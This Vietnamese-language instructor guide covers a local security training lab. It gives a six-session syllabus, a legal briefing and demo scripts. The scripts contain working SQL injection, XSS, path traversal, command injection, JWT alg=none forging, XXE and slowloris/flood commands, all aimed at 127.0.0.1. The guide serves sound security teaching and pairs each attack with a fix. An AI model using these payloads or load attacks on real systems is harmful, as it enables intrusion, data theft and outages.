# 09 — Hướng dẫn giảng dạy (Instructor Guide)

Tài liệu dành cho người **đứng lớp / hướng dẫn nhóm** dùng SecLab làm giáo cụ.
Mục tiêu: một buổi học chạy trơn tru, an toàn, và học viên tự kiểm chứng được
kiến thức bằng số liệu — không chỉ nghe lý thuyết.

> Người học tự ôn cũng đọc được file này như một "gợi ý lộ trình từng buổi".

---

## 1. Nguyên tắc thiết kế cần nắm trước khi dạy

| Nguyên tắc | Ý nghĩa giảng dạy |
|---|---|
| **Mọi lệnh chủ động qua `src/guard.js`** | Demo ngay phút đầu: chạy `scan` vào một domain public → bị từ chối. Đây là bài học pháp lý + kỹ thuật trong một lệnh. |
| **Loopback tự do · RFC1918 cần `--i-own-this-target` · Public chặn cứng** | Học viên không thể "lỡ tay" quét ra ngoài — dạy thoải mái mà không sợ pháp lý. |
| **Mỗi lỗ hổng có cặp vuln ↔ hardened** | Đừng chỉ demo khai thác; luôn kết thúc bằng "và đây là cách vá" rồi chạy scan lại trên bản hardened. |
| **Cờ CTF ngẫu nhiên theo phiên** | Không ai copy được đáp án của nhau — mỗi lần khởi động lab là một bộ cờ mới. |
| **`npm test` + `npm run e2e` là gate** | Dạy học viên thói quen: thay đổi gì cũng phải xanh lại hai lệnh này. |

## 2. Kiểm tra trước buổi học (5 phút)

```bash
node --version          # cần >= 22.5 (có node:sqlite); thấp hơn vẫn chạy — lab rơi về fallback in-memory
npm run doctor          # kiểm tra Node, sqlite, port 3000/3001 còn rảnh
npm test                # 115/115
npm run e2e             # 54/54
```

Nếu `doctor` báo port bận: đổi port bằng `-- --port 3002` hoặc tắt process đang
chiếm (`netstat -ano | findstr :3000` trên Windows).

## 3. Briefing an toàn — đọc to trước lớp (bắt buộc)

> "Hôm nay chúng ta sẽ **tấn công thật** — nhưng vào một lab do chính mình
> khởi động ở `127.0.0.1`. Mọi kỹ thuật các bạn học: SQL injection, XSS, tạo
> tải, giữ kết nối — nếu áp lên hệ thống của người khác mà không có giấy phép
> bằng văn bản là **phạm tội theo Điều 287 Bộ luật Hình sự 2015**, khung tù
> tới 7–12 năm. Công cụ này đã chặn cứng mục tiêu public — đừng tìm cách né
> nó; né guard là bạn đã chọn phạm pháp, không phải 'bypass kỹ thuật'."

Chi tiết: `docs/01-phap-ly-va-dao-duc.md` và chuyên mục 07 của SecHub
(`npm run hub`).

## 4. Giáo án gợi ý — 6 buổi (mỗi buổi ~2 giờ)

| Buổi | Nội dung | Bài tập | Demo chính |
|---|---|---|---|
| **1. Nền tảng & pháp lý** | Mô hình lab, guard, vuln↔hardened | `exercises/01` | `doctor` → `serve` → mở trình duyệt → `scan` vào public bị chặn |
| **2. Thăm dò & quét** | Recon, scanner 14 probe, đọc finding | `exercises/02`, `03` | `recon` → `scan` vuln (10 High + 4 Medium) → mở báo cáo HTML trong `reports/` |
| **3. Khai thác web** | SQLi, XSS, IDOR, traversal | `exercises/04` | `' OR 1=1 --` ở `/search`; `<script>alert(1)</script>`; `/api/users/4`; `/download?name=../flag-ctf.txt` |
| **4. Lỗ hổng nâng cao** | Command injection, CSRF, JWT, open redirect, upload, XXE, stored XSS | `exercises/10`–`13` | `& set SECLAB` / `; env`; `jwt crack` → `jwt forge`; upload `.html`; `<!ENTITY SYSTEM>` |
| **5. Tải & phòng thủ** | HTTP flood, slowloris, rate limit, timeout, detect | `exercises/05`, `06` | `loadtest` 50 rps vào `/slow` → p95 ~3s vuln vs 429 cứng hardened; `slowloris` 100 socket; `detect` đọc log |
| **6. CTF & tổng kết** | Thi đấu CTF 7 thử thách/170đ, viết báo cáo | `exercises/08`, `09` | `challenge` xem danh sách → nhóm tự khai thác → nộp cờ qua `/_lab/verify` |

Buổi 1–2 là nền bắt buộc; buổi 3–6 có thể tách thành chuỗi workshop riêng.

## 5. Kịch bản demo chạy-copy được ngay

### 5.1 "Một vòng hoàn chỉnh" (15 phút, buổi 1)

```bash
npm run serve                                          # terminal 1: lab vuln :3000
node src/cli.js recon http://127.0.0.1:3000            # headers + fingerprint
node src/cli.js scan http://127.0.0.1:3000             # → 10 High, 4 Medium; báo cáo vào reports/
npm run serve:hardened -- --port 3001                  # terminal 2: bản đã vá :3001
node src/cli.js scan http://127.0.0.1:3001             # → hầu hết "Đạt"
```

Điểm nhấn: **cùng một lệnh scan**, khác kết quả — chứng minh vá nằm ở server,
không phải scanner "bị lừa".

### 5.2 "Dữ liệu trở thành lệnh" (buổi 3–4)

```bash
# SQLi: số kết quả phình lên khi điều kiện luôn đúng
curl "http://127.0.0.1:3000/search?q=alice"
curl "http://127.0.0.1:3000/search?q=%27%20OR%201%3D1%20--"

# Command injection (Windows dùng &, Linux/macOS dùng ;)
curl "http://127.0.0.1:3000/tools/ping?host=127.0.0.1%20%26%20set%20SECLAB"

# JWT: crack secret rồi forge
TOKEN=$(curl -s -X POST http://127.0.0.1:3000/api/token -H 'content-type: application/json' -d '{"username":"alice","password":"alice123"}' | node -e "process.stdin.on('data',d=>console.log(JSON.parse(d).token))")
node src/cli.js jwt crack "$TOKEN"           # → secret123
FORGED=$(node src/cli.js jwt forge --payload='{"sub":"ctfsvc"}' --alg=none)
curl "http://127.0.0.1:3000/api/profile?token=$FORGED"   # → cờ CTF
```

### 5.3 "Chịu tải = từ chối có kiểm soát" (buổi 5)

```bash
node src/cli.js loadtest http://127.0.0.1:3000 --path=/slow --rps 50 --duration 8   # vuln: p95 ~3000ms
node src/cli.js loadtest http://127.0.0.1:3001 --path=/slow --rps 50 --duration 8   # hardened: rừng 429, server sống
node src/cli.js slowloris http://127.0.0.1:3000 --sockets 100 --duration 20         # vuln giữ ~100
node src/cli.js slowloris http://127.0.0.1:3001 --sockets 100 --duration 20         # hardened cắt sớm ~90
node src/cli.js detect http://127.0.0.1:3000                                        # blue-team nhìn log
```

## 6. Lỗi học viên thường gặp & cách xử lý

| Triệu chứng | Nguyên nhân | Xử lý |
|---|---|---|
| `EADDRINUSE` khi `serve:hardened` | Hai bản cùng mặc định port 3000 | `-- --port 3001` cho bản hardened |
| `scan` vào lab báo từ chối ủy quyền | Gõ `localhost`/`127.0.0.1` sai, hoặc gõ nhầm domain | Loopback chỉ gồm `127.0.0.1`, `::1`, `localhost` — kiểm tra lại URL |
| `TypeError ... sqlite` khi Node cũ | Node < 22.5 không có `node:sqlite` | Không sao — lab tự rơi về fallback in-memory; khuyến khích nâng Node ≥ 22.5 |
| Cờ CTF "sai" dù exploit đúng | Lab restart → cờ phiên đổi | Đọc lại cờ từ phiên đang chạy, đừng copy cờ cũ |
| `jwt forge` token không được nhận | Dùng nhầm bản hardened | alg=none chỉ được nhận ở vuln; đó là bài học |
| `loadtest` vào hardened "fail" | Limiter trả 429 — đúng thiết kế | Đây là kết quả *mong muốn*: 429 = phòng thủ hoạt động |
| Detect không thấy gì | Lab chưa bị "tấn công" | Chạy vài request exploit/scan trước để `/_lab/log` có dữ liệu |

## 7. Gợi ý chấm điểm

- **Bài tập**: mỗi file `exercises/` có checklist "Tiêu chí hoàn thành" — chấm
  theo checkbox, yêu cầu nộp kèm output/command đã chạy.
- **CTF**: điểm theo `/_lab/challenges` (tổng 170). Gợi ý: ≥ 60 điểm = đạt,
  ≥ 120 = khá, 170 = xuất sắc. Cờ per-session nên bắt buộc demo lại trực tiếp.
- **Báo cáo**: yêu cầu nộp 1 file `reports/*.md` do chính `scan` sinh ra + 1
  trang nhận xét "vì sao hardened đạt" — đánh giá tư duy phòng thủ.

## 8. Mở rộng cho nhóm khá

- Cho học viên **tự vá thêm một lỗ hổng** trong `src/lab/app.js` rồi viết test
  đối chứng hai phía — chuẩn theo `CONTRIBUTING.md` (lab mới phải kèm
  hardened + test + exercise).
- Bài tập mở rộng có sẵn trong tài liệu: nâng `loginSafe` lên bcrypt/Argon2id
  (khoảng cách cố ý để ngỏ, xem chuyên mục 05 SecHub).
- Dùng `detect` làm cuộc thi xanh–đỏ: nhóm A tấn công lab (trong giờ cho
  phép), nhóm B đọc log và liệt kê được bao nhiêu loại tấn công.
